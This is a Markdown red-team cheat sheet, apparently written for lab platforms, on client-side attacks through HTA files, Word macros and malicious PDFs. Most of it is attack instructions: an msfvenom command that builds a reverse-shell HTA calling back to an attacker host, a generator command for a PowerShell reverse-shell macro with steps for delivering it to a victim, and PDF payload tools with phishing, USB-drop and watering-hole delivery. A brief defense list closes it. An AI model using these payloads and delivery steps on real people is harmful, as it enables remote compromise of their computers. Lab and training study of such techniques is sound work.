# 🧠 Client‑Side Attacks 

> **GitHub‑ready notes** covering HTA attacks, Microsoft Office Macros, and Malicious PDFs for red‑team labs (HTB / THM / OSCP‑style).

---

## HTA Attack (HTML Application)

### 🎯 Use Case

Execute payloads via **Internet Explorer / mshta.exe** by convincing the user to open a malicious `.hta` file.

### 🔍 Identify Client Environment

Get details such as:

* Browser name
* OS
* Device type

🔗 User‑Agent Parser:

```
https://explore.whatismybrowser.com/useragents/parse/#parse-useragent
```

### ☠️ Generate Malicious HTA (Reverse Shell)

```bash
sudo msfvenom -p windows/shell_reverse_tcp \
LHOST=<IP> LPORT=<PORT> \
-f hta-psh \
-o /var/www/html/evil.hta
```

📌 Host the file and deliver via:

* Phishing email
* Download link
* USB drop (lab scenarios)

---

## Microsoft Word Macro Attack

### 🎯 Use Case

Execute **PowerShell reverse shell** via malicious macros embedded in `.doc` / `.docm` files.

### 🛠️ Tool: Evil‑Macro

Generate Base64‑encoded PowerShell macro payload.

🔗 Repo:

```
https://github.com/rodolfomarianocy/Evil-Macro/
```

### ⚙️ Generate Macro Payload

```bash
python evil_macro.py -l <IP> -p <PORT> -o macro.txt
```

### 📄 Delivery Steps

1. Create a Word document
2. Enable macros
3. Paste generated macro code
4. Save as `.docm`
5. Deliver to victim

⚠️ Requires user to **Enable Content**

---

## Malicious PDF Attacks

### 🎯 Use Case

Trigger callbacks or payload execution when PDF is opened.

---

### 🧪 Tool 1: malicious‑pdf

Generate PDF that triggers interaction with Burp Collaborator or listener.

🔗 Repo:

```
https://github.com/jonaslejon/malicious-pdf
```

### ⚙️ Usage

```bash
python3 malicious-pdf.py <burp-collaborator-url>
```

📌 Useful for:

* Blind interaction detection
* Client‑side exploitation confirmation

---

### 🧨 Tool 2: evilpdf

Advanced malicious PDF generator with payload embedding.

🔗 Repo:

```
https://github.com/superzerosec/evilpdf
```

### ⚙️ Example Usage

```bash
python evilpdf.py -i input.pdf -o evil.pdf
```

📌 Can be combined with:

* Social engineering
* Email phishing
* Watering‑hole attacks

---

## 🛡️ Defense Notes (Blue Team)

* Disable `mshta.exe`
* Block macro execution by default
* Enforce Protected View in Office
* Email attachment filtering
* EDR + AMSI logging

---

✅ **End of Client‑Side Attacks Cheat Sheet**
